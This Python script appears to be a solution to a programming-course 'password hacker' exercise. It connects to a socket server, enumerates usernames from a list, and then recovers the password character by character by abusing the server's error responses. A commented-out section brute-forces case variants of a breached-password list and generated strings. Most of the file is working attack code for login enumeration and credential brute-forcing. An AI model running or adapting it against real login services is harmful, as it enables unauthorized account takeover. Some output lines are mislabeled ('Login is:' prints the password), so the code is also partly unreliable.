import sys
import socket
import itertools
import string
import json
from icecream import ic

"""
Args: Host, port
Password list: https://www.troyhunt.com/the-773-million-record-collection-1-data-reach/
"""

socket_1 = socket.socket()
# address = (sys.argv[1], int(sys.argv[2]))
address = ("192.168.0.102", 9090)

alphabet_l = list(string.ascii_lowercase)
alphabet_u = list(string.ascii_uppercase)
nums = list(string.digits)
all_char = list(itertools.chain(nums, alphabet_l, alphabet_u))

socket_1.connect(address)
with open("passwords.txt", 'r') as f:
    pass_list = f.read().splitlines()

with open('logins.txt', "r") as f:
    login_list = f.read().splitlines()

def send_data(s1, data):
    to_send = json.dumps(data)
    s1.send(to_send.encode('utf8'))
    response = s1.recv(1024).decode()
    response = json.loads(response)
    print("Response:", response)
    return response

secret_login = ""
secret_password = ""

for login in login_list:

    login_json = {
    "login": login,
    "password": "" }
    
    response = send_data(socket_1, login_json)
    ic(login_json)

    if response['result'] == 'Wrong password!':
        secret_login = login
        break

    
i = 0
pas = ""
response = {"result": ""}
while response['result'] != "Connection success!":

    for char in enumerate(all_char):
        test = pas + char[1]

        response = send_data(socket_1, {"login": secret_login, "password": test})
        
        if response['result'] == "Connection success!":
           
           pas += char[1]
           break
        elif response['result'] == "Wrong password!":
            continue
        elif response['result'] == 'Exception happened during login':
            pas += char[1]
            break

response = json.dumps({"login": secret_login, "password": test})
print("\nPASSWORD FINDED:\n", response)
print(type(response))
print("Login is:", pas)

try:
    json_reply = json.loads(response)
except:
    print('The output of your program is not a valid JSON:\n')
"""
while True:
    # password list first
    for _ in pass_list:
        up_lo = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in _)))
        for a in up_lo:
            socket_1.send(a.encode())
            response = socket_1.recv(1024)
            if response.decode() == "Connection success!":
                print("Pass word was hacked:", _)
                break
        if response.decode() == "Connection success!":
            break
    if response.decode() == "Connection success!":
            break
    
    # generator 
    for _ in range(1, 5):
        prods = itertools.product(all_char, repeat=_)

        while True:
            try:
                a = next(prods)
            except StopIteration:
                break
            else:
                a = "".join(a)
                socket_1.send(a.encode())
                response = socket_1.recv(1024)
                if response.decode() == "Connection success!":
                    print("Password was hacked:", a)
                    break
        
    break
"""

socket_1.close()